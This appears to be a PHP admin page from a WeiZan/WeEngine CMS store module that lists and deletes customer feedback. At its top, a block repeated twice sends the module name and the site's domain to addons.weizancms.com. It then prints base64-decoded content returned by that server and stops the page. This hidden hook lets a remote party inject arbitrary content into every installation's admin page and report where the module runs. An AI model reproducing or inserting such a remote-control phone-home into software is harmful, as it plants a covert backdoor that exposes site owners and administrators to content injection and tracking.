<?php
global $_GPC, $_W;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$weid = $this->_weid;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$action = 'feedback';
$title = $this->actions_titles[$action];

$storeid = intval($_GPC['storeid']);
$this->checkStore($storeid);
$returnid = $this->checkPermission($storeid);
$cur_store = $this->getStoreById($storeid);
$GLOBALS['frames'] = $this->getNaveMenu($storeid,$action);

$url = $this->createWebUrl($action);
$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
if ($operation == 'display') {
    $cur_store = pdo_fetch("SELECT * FROM " . tablename($this->table_stores) . " WHERE id=:id AND weid=:weid LIMIT 1", array(':id' => $storeid, ':weid' => $weid));

    $pindex = max(1, intval($_GPC['page']));
    $psize = 15;
    $where = "WHERE a.weid = '{$weid}' and a.storeid = {$storeid}";

    $list = pdo_fetchall("SELECT a.*,b.nickname as nickname,b.headimgurl  FROM " . tablename($this->table_feedback) . "
        a LEFT JOIN " . tablename($this->table_fans) . " b ON a.from_user=b.from_user and a.weid=b.weid {$where} order by
        a.id
 desc LIMIT " . ($pindex - 1) * $psize . ",{$psize}");

    if (!empty($list)) {
        $total = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_feedback) . " a INNER JOIN " . tablename($this->table_fans) . " b ON a.from_user=b.from_user {$where} order by a.id desc");
        $pager = pagination($total, $pindex, $psize);
    }
} else if ($operation == 'delete') {
    $id = $_GPC['id'];
    pdo_delete($this->table_feedback, array('id' => $id, 'weid' => $weid));
    message('删除成功！', $this->createWebUrl('feedback', array('op' => 'display', 'storeid' => $storeid)), 'success');
}

include $this->template('web/feedback');